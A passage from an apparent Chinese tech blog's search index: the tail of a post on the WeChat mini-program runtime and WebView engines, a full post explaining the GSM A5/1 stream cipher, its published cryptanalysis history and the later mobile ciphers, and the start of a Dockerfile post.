组件渲染，或者是性能受限；小程序还依赖于某些原生组件，例如地图、视频等。</li>\n<li>逻辑层<br>  <code>JavaScript</code> 脚本工作在逻辑层，采用<code>JsCore</code>线程运行JS脚本。<br>  Service 是用主要用于执行小程序的 JS 逻辑。主要负责小程序的事件处理、API 调用和生命周期管理。扩展的原生功能通常来自宿主原生应用程序或操作系统，这些功能包括拍照、位置、蓝牙、网络状态、文件处理、扫描、电话等。它们通过某些 API 调用。当小程序调用原生 API 时，它会将 API 调用传递给扩展的原生功能，以便通过 JSBridge 进一步处理，并通过 JSBridge 从扩展的原生功能获取结果。Service 为每个 Render 建立连接，传输需要渲染的数据以进一步处理。</li>\n</ul>\n<img src=\"/2021/02/12/%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E7%9A%84%E8%BF%90%E8%A1%8C%E6%80%81%E7%8E%AF%E5%A2%83/runtime.png\" class=\"\">\n\n<p>视图层和逻辑层分离，两个线程的通信会经由微信客户端（下文中也会采用Native来代指微信客户端）做中转，这种结构有很多好处：</p>\n<ul>\n<li>方便多个小程序页面之间的数据共享和交互。</li>\n<li>在小程序的生命周期中具有相同的上下文可以为具备原生应用程序开发背景的开发人员提供熟悉的编码体验。</li>\n<li>Service 和 View 的分离和并行实现可以防止 JS 执行影响或减慢页面渲染，这有助于提高渲染性能。</li>\n<li>因为 JS 在 Service 层执行，所以 JS 里面操作的 DOM 将不会对 View 层产生影响，所以<strong>小程序是不能操作DOM结构的</strong>，这也就使得小程序的性能比传统的 H5 更好。</li>\n</ul>\n<h3 id=\"jsCore的运行环境\"><a href=\"#jsCore的运行环境\" class=\"headerlink\" title=\"jsCore的运行环境\"></a>jsCore的运行环境</h3><p>微信小程序可以运行在多种平台上：iOS（iPhone&#x2F;iPad）微信客户端、Android 微信客户端、PC 微信客户端、Mac 微信客户端和用于调试的微信开发者工具。</p>\n<p>各平台脚本执行环境以及用于渲染非原生组件的环境是各不相同的：</p>\n<table>\n<thead>\n<tr>\n<th align=\"center\">运行平台</th>\n<th align=\"center\">页面渲染引擎</th>\n<th align=\"center\">JS解析引擎</th>\n<th align=\"center\">备注</th>\n</tr>\n</thead>\n<tbody><tr>\n<td align=\"center\">iOS APP</td>\n<td align=\"center\">WKWebView</td>\n<td align=\"center\">JavaScriptCore</td>\n<td align=\"center\">Apple的强制标准</td>\n</tr>\n<tr>\n<td align=\"center\">Android APP</td>\n<td align=\"center\">腾讯自研XWeb</td>\n<td align=\"center\">V8</td>\n<td align=\"center\">基于BOM的碎片化问题</td>\n</tr>\n<tr>\n<td align=\"center\">MacOS Client</td>\n<td align=\"center\">WKWebView</td>\n<td align=\"center\">JavaScriptCore</td>\n<td align=\"center\">与iOS完全一致</td>\n</tr>\n<tr>\n<td align=\"center\">Window Client</td>\n<td align=\"center\">Chrome</td>\n<td align=\"center\">Chrome</td>\n<td align=\"center\"></td>\n</tr>\n<tr>\n<td align=\"center\">开发者工具</td>\n<td align=\"center\">Chromium Webview</td>\n<td align=\"center\">NW.js</td>\n<td align=\"center\">自定义</td>\n</tr>\n</tbody></table>\n<blockquote>\n<p>node-webkit（NW.js），是node.js和webkit的结合体，webkit提供DOM操作，node.js提供本地化操作；且将二者的context完全整合，可在HTML代码中直接使用node.js的API。</p>\n</blockquote>\n<p>微信、支付宝、头条等头部APP纷纷打造自己的小程序生态，基本方案都是基于chromium改造的浏览器内核，但基线版本有所不同，例如支付宝基于chrome 57&#x2F;69等版本，百度基于chrome 63，头条基于Chrome 62等。</p>\n<h3 id=\"X5-渲染引擎\"><a href=\"#X5-渲染引擎\" class=\"headerlink\" title=\"X5 渲染引擎\"></a>X5 渲染引擎</h3><p>腾讯浏览服务是致力于优化移动端webview体验的整套解决方案。该方案由SDK、手机QQ浏览器X5内核和X5云端服务组成，腾讯X5内核在腾讯家的很多产品使用，包括微信，QQ，QQ浏览器。</p>\n<p>腾讯浏览服务 TBS 在 2.3 版本中，其 X5 内核就是基于 Android 5.0 WebView Blink内核（M37版本）定制优化。</p>\n<p>从微信6.1版本起，android用户全部使用的QQ浏览器的X5内核。</p>\n<blockquote>\n<p>5.4-6.1之间的版本，若用户安装了QQ浏览器就是使用的X5内核，若用户未安装浏览器，使用的是系统默认内核。</p>\n</blockquote>\n<p>x5浏览器内核的UA特征字符串是：<code>Chrome/66.0.3359.126 MQQBrowser/6.2 TBS/044903</code></p>\n<h3 id=\"XWeb-渲染引擎\"><a href=\"#XWeb-渲染引擎\" class=\"headerlink\" title=\"XWeb 渲染引擎\"></a>XWeb 渲染引擎</h3><p>大概从2020年起，微信团队放弃了X5内核，自研并默认更换为XWeb内核，其UA特征字符串是：<code>Chrome/67.0.3396.87 XWEB/882 MMWEBSDK/190506</code></p>\n<p>同时，JS引擎也从基于 Mobile Chrome 57 内核的X5，改为基于 Mobile Chrome 67 内核的V8引擎。</p>\n<p>恭喜微信团队，终于回到了Google标准的道路！！！</p>\n<hr>\n<h2 id=\"附录一：关于如何查看Android手机端webview的版本\"><a href=\"#附录一：关于如何查看Android手机端webview的版本\" class=\"headerlink\" title=\"附录一：关于如何查看Android手机端webview的版本\"></a>附录一：关于如何查看Android手机端webview的版本</h2><ol>\n<li>日志里查ua</li>\n<li>在系统设置里找到所有应用，显示隐藏系统进程，在里面找到Android system webview，显示的版本即为chrome版本。</li>\n</ol>\n<ul>\n<li><p>Android手机默认浏览器和webview的区别<br>国外品牌的安卓手机，自带浏览器就是chrome。而国内安卓手机，自带浏览器大多是QQ浏览器、UC浏览器的贴牌，极个别是自己改造chromium。<br>所以手机自带的浏览器并不等于webview，在一个平台可运行，不代表另一个平台可兼容。<br>QQ、UC、360等浏览器也基本是基于chromium做改造，不同版本的浏览器其使用的chromium内核版本也不一样。具体可以打印ua查看。<br>注意夜神等安卓模拟器的Android版本是4.4，很多新语法都不支持。</p>\n</li>\n<li><p>如果你有影响用户的能力，为了给用户更好的体验，可以引导Android用户安装最新版Android system webview。应用宝、华为、金立等应用市场均可下载这个apk，或者翻墙到google play store。<br>在华为、小米、金立手机上，wifi下会自动更新Android system webview。<br>尤其是有些Android5用户使用的Android system webview 37版本，有硬件加速bug，闪屏花屏，此时升级webview即可解决。</p>\n</li>\n<li><p>有人问可否在打包时直接集成新版Android system webview，减少浏览器兼容问题？<br>webview体积至少50M起，体积实在太大了。有兴趣的开发者可以自己研究离线打包。<br>倒是可以这样：js里判断当前手机是Android5以上，且webview版本过低，比如低于40（ua可以判断），可以提醒用户是否升级webview，然后引导用户去之前贴出的地址下载更新webview。<br>但不管怎么样，尽量少写可能遇到兼容性问题的代码。</p>\n</li>\n</ul>\n<hr>\n<h2 id=\"参考文献\"><a href=\"#参考文献\" class=\"headerlink\" title=\"参考文献\"></a>参考文献</h2><ul>\n<li><a href=\"https://developers.weixin.qq.com/miniprogram/dev/framework/MINA.html\">微信小程序的开发指南</a></li>\n<li><a href=\"https://microapp.bytedance.com/docs/zh-CN/mini-app/develop/framework/basic-reference/catalog-structure\">字节跳的小程序的开发指南</a></li>\n<li><a href=\"https://x5.tencent.com/docs/index.html\">腾讯浏览服务TBS的官方网站</a></li>\n<li><a href=\"https://nwjs.io/\">NW.js的官方主页</a></li>\n<li><a href=\"https://course.talelin.com/lin/lin-ui/\">微信小程序的优秀教材</a></li>\n<li><a href=\"http://www.ruanyifeng.com/blog/2020/10/wechat-miniprogram-tutorial-part-one.html\">阮一峰—微信小程序入门教程</a></li>\n<li><a href=\"https://www.cnblogs.com/chris-oil/p/12866317.html\">关于手机webview内核的兼容性</a></li>\n<li><a href=\"https://ask.dcloud.net.cn/article/36348\">Appstore审核反馈废弃UIWebview APIs问题的说明</a></li>\n<li><a href=\"https://www.jianshu.com/p/2a14d303308d\">X5 浏览器内核调研报告</a></li>\n<li><a href=\"https://blog.csdn.net/typename/article/details/40425275\">Android 各个版本WebView的技术架构</a></li>\n</ul>\n"},{"title":"流密码算法的硬件实现-以GSM网络的A5算法为例","url":"/2022/12/23/%E6%B5%81%E5%AF%86%E7%A0%81%E7%AE%97%E6%B3%95%E7%9A%84%E7%A1%AC%E4%BB%B6%E5%AE%9E%E7%8E%B0-%E4%BB%A5GSM%E7%BD%91%E7%BB%9C%E7%9A%84A5%E7%AE%97%E6%B3%95%E4%B8%BA%E4%BE%8B/","content":"<p>1917 年, Vernam 密码体制被提出, 后来 Mauborgne 提出了改进方案, 即 “一次一密” 密码体制。<br>1949 年, Shannon 证明 “一次一密” 密码体制具备完全的理论安全性，但必须满足三个条件：</p>\n<ul>\n<li>密钥流必须完全随机生成</li>\n<li>密钥长度至少与明文相同</li>\n<li>密钥不能重复使用</li>\n</ul>\n<p>这些限制条件在实际应用中存在很大困难，而且密钥的生成、分配和管理也是不容忽视的问题，因此科学家设计了各种流密码（Stream cipher，也称为流加密）算法来代替 “一次一密” 体制，其基本特征是：</p>\n<ul>\n<li>作为一种对称加密算法，加密和解密双方使用相同的伪随机加密数据流（pseudo-random stream）作为密钥流（Keystream）</li>\n<li>明文数据（Plaintext）按 bit 位与密钥流<strong>顺次</strong>对应执行异或（XOR）操作，得到密文数据流（Cipertext）</li>\n</ul>\n<p>为了提高处理性能，伪随机密钥流（keystream）通常由一个随机的种子（seed）通过 PRG 算法（pseudo-random generator）生成，即由较短的数据流通过特定算法得到较长的密钥流，因此 PRG 算法的不可预测性成为确保流加密安全性的关键问题。</p>\n<h2 id=\"一、GSM-安全体系\"><a href=\"#一、GSM-安全体系\" class=\"headerlink\" title=\"一、GSM 安全体系\"></a>一、GSM 安全体系</h2><p>GSM 的安全性基于对称密钥的加密体系，定义了三种加密算法：</p>\n<ul>\n<li>A3：用于移动设备到 GSM 网络认证的算法，负责生成认证码 SRES</li>\n<li>A5：用于认证成功后加密语音和数据的算法，负责生成会话密钥（一次一密）</li>\n<li>A8：用于产生对称密钥的密钥生成算法，负责生成通信密钥 Kc</li>\n</ul>\n<p>SIM 是 GSM 终端的关键安全载体，负责实现 A3 和 A8 算法，并负责持久化存储核心数据：</p>\n<ul>\n<li>IMSI：SIM 卡的全球唯一的标志号。手机在开机时，一次性从卡里面读出并发给移动网络，鉴权成功后生成并对外提供 TMSI</li>\n<li>Ki：SIM 卡的唯一根密钥，16字节长度，长期存储。无法通过 SIM 卡的接口读出，只能用于生成密钥，例如 Kc</li>\n</ul>\n<p>GSM 的各个网元分别提供相关安全能力：</p>\n<ul>\n<li>移动终端：负责实现 A5 算法，并持有 TMSI。</li>\n<li>HLR&#x2F;AUC： 保存 IMSI 和手机号的对应关系、IMSI 和 Ki 的对应关系，提供 RAND 随机数，负责实现 A3 和 A8 算法</li>\n<li>MSC：持有 IMSI 并生成 TMSI，管理认证向量（RAND、SRES、Ki），也称为<strong>认证三元组</strong></li>\n<li>BST：负责实现 A5 算法</li>\n<li>EIR：设备标识寄存器，负责核对 IMEI</li>\n</ul>\n<p><img src=\"/2022/12/23/%E6%B5%81%E5%AF%86%E7%A0%81%E7%AE%97%E6%B3%95%E7%9A%84%E7%A1%AC%E4%BB%B6%E5%AE%9E%E7%8E%B0-%E4%BB%A5GSM%E7%BD%91%E7%BB%9C%E7%9A%84A5%E7%AE%97%E6%B3%95%E4%B8%BA%E4%BE%8B/COMP128.png\" alt=\"A3 &amp; A8\"></p>\n<p>在手机登录移动网络的时候，移动网络会产生一个 16 字节的随机数据 RAND 发给手机，手机将这个数据发给 SIM 卡， SIM 卡用自己的密钥 Ki 和 RAND 做运算以后，生成一个 4 字节的应答 SRES 发回给手机，并转发给移动网络，与此同时，移动网络也进行了相同算法的运算，移动网络会比较一下这两个结果是否相同，相同就表明这个卡是我发出来的，允许其登录。这个就是 GSM 规范的 A3 算法，m &#x3D; 128 bit, k &#x3D; 128 bit, c &#x3D; 32 bit，很显然，这个算法要求已知 m 和 k 可以很简单的算出 c ，但是已知 m 和 c 却很难算出 k 。A3 算法是做在 SIM 卡里面的，因此如果运营商想更换加密算法，他只要发行自己的 SIM 卡，让自己的基站和 SIM 卡都使用相同的算法就可以了，手机完全不用换。</p>\n<p>在移动网络发送 RAND 过来的时候，手机还会让 SIM 卡对 RAND 和 Ki 计算出另一个密钥以供全程通信加密使用，这个密钥的长度是 64 bits, 通常叫做 <strong>Kc</strong>, 生成 Kc 的算法是 A8 算法 ，因为 A3 算法和 A8 算法接受的输入完全相同，所以实现者偷了个懒，用一个算法 COMP128 同时生成 SRES 和 Kc 。</p>\n<h2 id=\"二、A5-算法原理\"><a href=\"#二、A5-算法原理\" class=\"headerlink\" title=\"二、A5 算法原理\"></a>二、A5 算法原理</h2><p>由于移动终端和网络基站之间的无线数据传输完全暴露在开放环境，空中接口的安全问题必须得到解决。第一代移动通信实现了控制信道的数字化，但业务信道由于仍然采用模拟技术因而无法实现加密，GSM 系统通过业务信道的数字化并采用了流密码技术，有效解决了传输安全问题，因此迅速得到普及推广，其中 A5 算法功不可没。<br>根据 GSM 规范，先后发布了7个版本的 A5 算法，但 A5&#x2F;1 是第一个版本，得到了最广泛的应用，如果没有特别说明，通常所说的 A5 就是指 A5&#x2F;1。</p>\n<p>加解密处理需要消耗大量的计算资源，早期的流密码大多基于专用硬件实现，最典型的就是 LFSR - 线性反馈移位寄存器，A5&#x2F;1 算法就是如此。<br>1987年，法国开发了 A5&#x2F;1 算法，用于对从电话到基站连接的加密处理，效率很高并符合统计检验要求。起初该算法是保密的，但最终不慎泄漏。</p>\n<p><img src=\"/2022/12/23/%E6%B5%81%E5%AF%86%E7%A0%81%E7%AE%97%E6%B3%95%E7%9A%84%E7%A1%AC%E4%BB%B6%E5%AE%9E%E7%8E%B0-%E4%BB%A5GSM%E7%BD%91%E7%BB%9C%E7%9A%84A5%E7%AE%97%E6%B3%95%E4%B8%BA%E4%BE%8B/a5-arch.png\" alt=\"A5\"></p>\n<h3 id=\"1-LFSR-线性反馈移位寄存器\"><a href=\"#1-LFSR-线性反馈移位寄存器\" class=\"headerlink\" title=\"1. LFSR - 线性反馈移位寄存器\"></a>1. LFSR - 线性反馈移位寄存器</h3><p>A5&#x2F;1 算法使用3个线性反馈移位寄存器，位长分别为 19 + 22 + 23 &#x3D; 64。这个设计绝非偶然，正好用以容纳 64位 的初始密钥 Kc 。</p>\n<table>\n<thead>\n<tr>\n<th align=\"center\">寄存器编号</th>\n<th align=\"center\">寄存器位数</th>\n<th align=\"center\">钟控位</th>\n<th align=\"center\">抽头位</th>\n</tr>\n</thead>\n<tbody><tr>\n<td align=\"center\">1</td>\n<td align=\"center\">19</td>\n<td align=\"center\">8</td>\n<td align=\"center\">13, 16, 17, 18</td>\n</tr>\n<tr>\n<td align=\"center\">2</td>\n<td align=\"center\">22</td>\n<td align=\"center\">10</td>\n<td align=\"center\">20, 21</td>\n</tr>\n<tr>\n<td align=\"center\">3</td>\n<td align=\"center\">23</td>\n<td align=\"center\">10</td>\n<td align=\"center\">7, 20, 21, 22</td>\n</tr>\n</tbody></table>\n<p>那么，这三个LFSR是如何生成密钥流的呢？对于每一个寄存器，它会通过向最高位的移动(产下处于最高位的孩子)来产生密钥，3个寄存器都通过这种操作来产生密钥，然后3个最高位经过异或操作得到最终的密钥。<br>下一个问题是如何补充最低位呢？答案是不同的寄存器采取不同的抽头策略，1号寄存器是计算第18、17、16、13位（<strong>图中的蓝色位</strong>）的异或值作为下一状态的最低位，2号寄存器是第21、20位的异或值，3号寄存器是第22、21、20、7位的异或值。</p>\n<h3 id=\"2-钟控方式\"><a href=\"#2-钟控方式\" class=\"headerlink\" title=\"2. 钟控方式\"></a>2. 钟控方式</h3><p>为了提高复杂性以弱化线性漏洞，A5算法采用了一种基于<strong>择多原则</strong>的钟控方式，即在会话密钥的产生过程中，并非每个 LFSR 每次都会移动。</p>\n<ul>\n<li>每个寄存器都有一个相关的钟控位，分别是第8、10、10位（<strong>图中的黄色位</strong>）</li>\n<li>在每个周期，检查三个寄存器的钟控位，并确定多数位（0或者1）</li>\n<li>对于每个寄存器，如果钟控位与多数位一致，则对寄存器作移位操作；否则，寄存器不移动，也就是前后两次提供的密钥是相同的</li>\n</ul>\n<p>由于寄存器的个数是奇数，因此择多原则必然生效，不会存在无法判决的情况；同时，每次必然有2-3个寄存器发生移位，并且每个寄存器移位的概率都是3&#x2F;4。<br>描述为：给定三个二进制位 x 、 y 和 z ，定义多数投票函数 maj(x, y, z)。也就是说，如果 x 、 y 和 z 的多数为 0，那么函数返回 0；否则，函数返回 1。</p>\n<h3 id=\"3-工作流程\"><a href=\"#3-工作流程\" class=\"headerlink\" title=\"3. 工作流程\"></a>3. 工作流程</h3><p>根据 GSM 系统的定义，每 20ms 的模拟话音进行一次采样，通过信源编码处理成 260bit 的数字信号；再经过信道编码变换为 456bit 的数字信号，然后经过交织分成8个部分，每部分 57bit ；空中的时隙中，每个时隙承载2部分即 114个bit 的内容，于是 20ms 的话音完全通过4个时隙的资源承载。因此，明文是一个 114位 的比特流，需要相应提供一个 114位 的密钥流。</p>\n<ol>\n<li>密钥导入：三个 LFSR 清零复位，执行<code>XOR + Shift</code>动作 64 次以导入密钥；</li>\n<li>随机数引入：以帧序号作为输入，三个 LFSR 执行<code>XOR + Shift</code>动作 22 次以导入随机数；</li>\n<li>概率校正：三个 LFSR 执行钟控动作 100 次，但不输出乱数；</li>\n<li>上行密钥流生成：三个 LFSR 执行钟控动作 114 次，每次动作后将三个 LFSR 的最高位输出并执行 XOR 作为上行密钥流输出；</li>\n<li>下行密钥流生成：重复步骤4，并将输出作为下行密钥流。</li>\n</ol>\n<blockquote>\n<p>TDMA 帧号以 2715648 为周期循环编号（22位），2<sup>21</sup>&#x3D;2097152 &lt; 2715648 &gt; 4194304&#x3D;2<sup>22</sup><br>构造方式 <code>2715648 = 2048 * 26 * 51</code> ：基帧（8个时隙，4.615ms）—&gt; 复帧（业务为26帧，控制为51帧）—&gt; 超帧（26*51个帧）—&gt; 巨帧（2048个超帧）</p>\n</blockquote>\n<h3 id=\"4-破解之路\"><a href=\"#4-破解之路\" class=\"headerlink\" title=\"4. 破解之路\"></a>4. 破解之路</h3><p>A5&#x2F;1 算法曾经是使用最广泛的GSM加密算法，在设备中的支持程度也是几种算法中最高的。该算法在1994年被初步泄露，在1999年通过逆向工程的方式被公布，2000年开始被逐步破解。</p>\n<ul>\n<li>2000年，Alex Biryukov 等通过构造庞大的具备初步彩虹表概念的数据库，通过查表取代计算的方式，以空间换时间，对A5&#x2F;1实施已知明文攻击，但该方法需要首先通过大约248次运算，处理约300GB的数据</li>\n<li>2007年，德国 Bochum 大学搭建了具有120个 FPGA 节点的阵列加速器，对包括A5&#x2F;1算法在内的多种算法进行破解，由于采用FPGA成本较低，使A5&#x2F;1算法破解在商业上成为可能</li>\n<li>2009年，Karsten Nohl 等人利用3个月时间制作了2TB的彩虹表，并宣布利用P2P分布式网络下的Nvidia GPU显卡阵列即可破解A5&#x2F;1算法</li>\n<li>2016年，新加坡科技研究局用55天创建了一个 984GB 的彩虹表，通过使用3块 Nvidia GPU 显卡构成的计算装置在9秒内完成对A5&#x2F;1算法的破解</li>\n<li>此外，根据斯诺登披露的文件显示，美国NSA是可以破解A5&#x2F;1算法的。</li>\n</ul>\n<p>1993年，由于受巴统限制，A5&#x2F;1 算法作为出口管制技术无法集成到在中国境内使用的设备中，为此开发了弱化版本的 A5&#x2F;2 算法。该密码基于 4个 LFSR 的组合，具有不规则时钟和一个非线性组合器。<br>1999年，该算法被发现存在缺陷（后门）可以被实时破解，随后 3GPP标准 TS 33.020 中明确禁止使用。</p>\n<h2 id=\"三、移动通信网的密码算法演进\"><a href=\"#三、移动通信网的密码算法演进\" class=\"headerlink\" title=\"三、移动通信网的密码算法演进\"></a>三、移动通信网的密码算法演进</h2><table>\n<thead>\n<tr>\n<th align=\"center\">加密算法</th>\n<th align=\"center\">私有</th>\n<th align=\"center\">私有</th>\n<th align=\"center\">KAUSMI</th>\n<th align=\"center\">KAUSMI</th>\n<th align=\"center\">SNOW 3G</th>\n<th align=\"center\">AES</th>\n<th align=\"center\">ZUC</th>\n</tr>\n</thead>\n<tbody><tr>\n<td align=\"center\">算法类型</td>\n<td align=\"center\">流密码</td>\n<td align=\"center\">流密码</td>\n<td align=\"center\">分组密码</td>\n<td align=\"center\">分组密码</td>\n<td align=\"center\">流密码</td>\n<td align=\"center\">分组密码</td>\n<td align=\"center\">流密码</td>\n</tr>\n<tr>\n<td align=\"center\">密钥长度</td>\n<td align=\"center\">64</td>\n<td align=\"center\">64</td>\n<td align=\"center\">64</td>\n<td align=\"center\">128</td>\n<td align=\"center\">128</td>\n<td align=\"center\">128</td>\n<td align=\"center\">128</td>\n</tr>\n<tr>\n<td align=\"center\">工作模式</td>\n<td align=\"center\">XOR</td>\n<td align=\"center\">XOR</td>\n<td align=\"center\">f8-mode</td>\n<td align=\"center\">f8-mode</td>\n<td align=\"center\">XOR</td>\n<td align=\"center\">CTR</td>\n<td align=\"center\">XOR</td>\n</tr>\n<tr>\n<td align=\"center\">GSM(2G)</td>\n<td align=\"center\">A5&#x2F;1</td>\n<td align=\"center\">A5&#x2F;2</td>\n<td align=\"center\">A5&#x2F;3</td>\n<td align=\"center\">A5&#x2F;4</td>\n<td align=\"center\"></td>\n<td align=\"center\"></td>\n<td align=\"center\"></td>\n</tr>\n<tr>\n<td align=\"center\">GPRS (2.5G)</td>\n<td align=\"center\">GEA1</td>\n<td align=\"center\">GEA2</td>\n<td align=\"center\">GEA3</td>\n<td align=\"center\">GEA4</td>\n<td align=\"center\"></td>\n<td align=\"center\"></td>\n<td align=\"center\"></td>\n</tr>\n<tr>\n<td align=\"center\">UMTS(3G)</td>\n<td align=\"center\"></td>\n<td align=\"center\"></td>\n<td align=\"center\"></td>\n<td align=\"center\">UEA1</td>\n<td align=\"center\">UEA2</td>\n<td align=\"center\"></td>\n<td align=\"center\"></td>\n</tr>\n<tr>\n<td align=\"center\">LTE(4G)</td>\n<td align=\"center\"></td>\n<td align=\"center\"></td>\n<td align=\"center\"></td>\n<td align=\"center\"></td>\n<td align=\"center\">128-EEA1</td>\n<td align=\"center\">128-EEA2</td>\n<td align=\"center\">128-EEA3</td>\n</tr>\n<tr>\n<td align=\"center\">NR(5G)</td>\n<td align=\"center\"></td>\n<td align=\"center\"></td>\n<td align=\"center\"></td>\n<td align=\"center\"></td>\n<td align=\"center\">128-NEA1</td>\n<td align=\"center\">128-NEA2</td>\n<td align=\"center\">128-NEA3</td>\n</tr>\n</tbody></table>\n<blockquote>\n<p>GSM是一个面向语音通信的网络，2.5G 增加了分组交换的核心网 GPRS，采用的加密算法仍然是 A5 系列算法，但名称改为 GEA（GPRS Encryption Algorithm）。</p>\n</blockquote>\n<h3 id=\"1-KASUMI-算法\"><a href=\"#1-KASUMI-算法\" class=\"headerlink\" title=\"1. KASUMI 算法\"></a>1. KASUMI 算法</h3><p>不同于流密码性质的 A5&#x2F;1 和 A5&#x2F;2 算法，GSM 规范还纳入了 A5&#x2F;3 和 A5&#x2F;4 算法，他们都是基于 KASUMI 的分组密码。<br>KASUMI 是日本三菱的 Matsui 等人基于 MISTY 算法改进而来，采用 Feistel 结构，密钥长度为128比特，对一个64比特的输入分组进行八轮的迭代运算，产生长度为64比特的输出。轮函数包括一个输入输出为32比特的非线性混合函数 FO 和一个输入输出为32比特的线性混合函数 FL。函数 FO 由一个输入输出为16比特的非线性混合函数 FI 进行3轮重复运算而构成。而函数 Fl 是由使用非线性的S盒 S7 和 S9 构成的4轮结构。</p>\n<p>A5&#x2F;3 算法的分组大小 64bit，密钥长度 64位。为了实现流密码能力，其工作模式为 F8 机密性算法和 F9 完整性算法，其中 F8 是变形的 OFB 模式，F9 是变形的 CBC-MAC 模式。<br>2001年开始，A5&#x2F;3 算法不断受到安全性挑战，为此将密钥长度扩展到了128位并推出 A5&#x2F;4 算法。<br>2015年，A5&#x2F;4 算法仍然遭到破解，为此 4G 标准制定时 KASUMI 被完全放弃。</p>\n<h3 id=\"2-SNOW-3G-算法\"><a href=\"#2-SNOW-3G-算法\" class=\"headerlink\" title=\"2. SNOW 3G 算法\"></a>2. SNOW 3G 算法</h3><p>SNOW 1.0是欧洲的 NESSIE（New European Schemes for Signatures, Integrity and Encryption）项目中产生的候选算法，是一种 128位 的流加密算法。<br>SNOW 1.0算法在公开后，被发现存在一些算法缺陷，之后经过不断修订和增强，从 SNOW 1.0，SNOW 2.0直到 SNOW 3G被认可作为 3G 使用的第二种算法 UEA2。<br>后续，4G 标准中沿用为 128-EEA1，5G标准中沿用为 128-NEA2。</p>\n<h3 id=\"3-AES-算法\"><a href=\"#3-AES-算法\" class=\"headerlink\" title=\"3. AES 算法\"></a>3. AES 算法</h3><p>在 4G 标准中，AES-128 分组算法（ CTR 工作模式）被引入并命名为 128-EEA2，后续 5G 标准继续沿用为 128-NEA2。<br>采用 AES 取代 KASUMI 主要有以下原因：</p>\n<ul>\n<li>4G的基站需要实现 NDS&#x2F;IP 的保护，而 NDS&#x2F;IP 中需要使用 AES，所以4G的基站天然支持AES算法；</li>\n<li>KASUMI 算法有授权费用，虽然使用KASUMI进行完整性保护不需要缴费，但若用于加密则需要缴费；</li>\n<li>此外，4G 支持非 3GPP 接入，而 AES 在非 3GPP 接入（例如 WLAN）场景中的应用更广。</li>\n</ul>\n<h3 id=\"4-ZUC-算法\"><a href=\"#4-ZUC-算法\" class=\"headerlink\" title=\"4. ZUC 算法\"></a>4. ZUC 算法</h3><p>2009年，在3GPP SA3立项讨论时，考虑到中国自主加密算法的需求，在工信部和国家密码局的领导下，由信通院牵头，中国移动、中国联通、大唐、华为、中兴、中科院软件所等参与成立中国自主加密算法推进工作组。<br>2011年，中科院软件所设计的祖冲之算法（代号ZUC）正式纳入3GPP标准，在LTE Rel-11版本中成为可选的第3种加密算法。祖冲之算法为流加密算法，具备与SNOW 3G基本等同的性能和加密强度。</p>\n<h2 id=\"四、总结分析\"><a href=\"#四、总结分析\" class=\"headerlink\" title=\"四、总结分析\"></a>四、总结分析</h2><p>从移动通信网络的加密技术演进中分析，传统的流密码技术正在被分组加密技术逐渐替代。</p>\n<ol>\n<li>随着硬件处理能力的高速发展，基于通用 CPU 的分组加密算法和基于专用硬件的流密码算法的性能差距几乎消失，而加密专用指令集进一步扩大了分组密码的技术优势和成本优势；</li>\n<li>随着网络数据流量的高速增长，伪随机密钥流的构造难度越来越高，流密码算法被攻击破解的风险显著增加，而种类丰富的分组密码算法可以提供更高强度的安全性；</li>\n<li>随着加密密钥长度的不断增加（64-128-256），许多流密码算法也从按 bit 顺序加密，转向按 byte 顺序加密，几乎等价于 8位 的分组加密方案，也说明了两者正在逐步融合；</li>\n<li>OFB、CFB 和 CTR等工作模式技术的出现，可以很方便地将分组密码算法<strong>转换</strong>为流密码算法</li>\n</ol>\n<hr>\n<h2 id=\"参考文献\"><a href=\"#参考文献\" class=\"headerlink\" title=\"参考文献\"></a>参考文献</h2><ul>\n<li><a href=\"https://www.sohu.com/a/237953596_556637\">移动通信网中的密码算法演进之一：机密性保护</a></li>\n<li><a href=\"https://www.jiamisoft.com/blog/22123-gsma.html\">GSM加密系统里涉及的三种算法：A3算法、A5算法和A8算法</a></li>\n<li><a href=\"https://zh.wikipedia.org/zh-sg/A5/1\">A5算法 - WiKi</a></li>\n<li><a href=\"http://kenshichong.github.io/2015/12/26/%E5%AF%86%E7%A0%81%E7%B3%BB%E5%88%972-%E6%B5%81%E5%AF%86%E7%A0%81%E5%AE%9E%E6%88%98%E4%B9%8BA5%E7%AE%97%E6%B3%95/\">密码系列2-流密码实战之A5算法</a></li>\n<li><a href=\"https://www.cnblogs.com/mengsuenyan/p/13819504.html\">ZUC祖冲之序列密码算法</a></li>\n<li><a href=\"https://juejin.cn/post/7118582525424828424\">ZUC(祖冲之)算法</a></li>\n<li><a href=\"https://www.jiamisoft.com/blog/2669-kasumijiamisuanfa.html\">3G核心加密算法之KASUMI加密算法</a></li>\n</ul>\n<h3 id=\"文档下载\"><a href=\"#文档下载\" class=\"headerlink\" title=\"文档下载\"></a>文档下载</h3><ul>\n<li><a href=\"%E6%B5%81%E5%AF%86%E7%A0%81%E7%AE%97%E6%B3%95%E3%80%81%E6%9E%B6%E6%9E%84%E4%B8%8E%E7%A1%AC%E4%BB%B6%E5%AE%9E%E7%8E%B0%E7%A0%94%E7%A9%B6_%E8%B5%B5%E7%9F%B3%E7%A3%8A.pdf\">流密码算法、架构与硬件实现研究_赵石磊</a></li>\n<li><a href=\"Security_in_the_GSM_system_20040105.pdf\">GSM系统安全体系 - 2004英文版</a></li>\n<li><a href=\"S5.Brumley-comp128.pdf\">A3&#x2F;A8 &amp; COMP128 技术破解</a></li>\n<li><a href=\"A5-1%E7%AE%97%E6%B3%95%E5%8F%AF%E6%8A%B5%E6%8A%97%E7%9B%B8%E5%85%B3%E6%94%BB%E5%87%BB%E7%9A%84%E6%94%B9%E8%BF%9B%E6%96%B9%E6%B3%95-%E5%BC%A0%E4%BC%9F.pdf\">A5&#x2F;1 算法可抵抗相关攻击的改进方法 - 张伟</a></li>\n<li><a href=\"a52-slides.pdf\">a5&#x2F;2 算法的破解分析</a></li>\n<li><a href=\"978-3-540-45146-4_35.pdf\">Instant Ciphertext-Only Cryptanalysis of GSM Encrypted Communication</a></li>\n</ul>\n"},{"title":"深入理解Dockerfile文件中的Entrypoint和Cmd命令","url":"/2019/11/16/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Dockerfile%E6%96%87%E4%BB%B6%E4%B8%AD%E7%9A%84Entrypoint%E5%92%8CCmd%E5%91%BD%E4%BB%A4/","content":"<h2 id=\"CMD\"><a href=\"#CMD\" class=\"headerlink\" title=\"CMD\"></a>CMD</h2><p><a 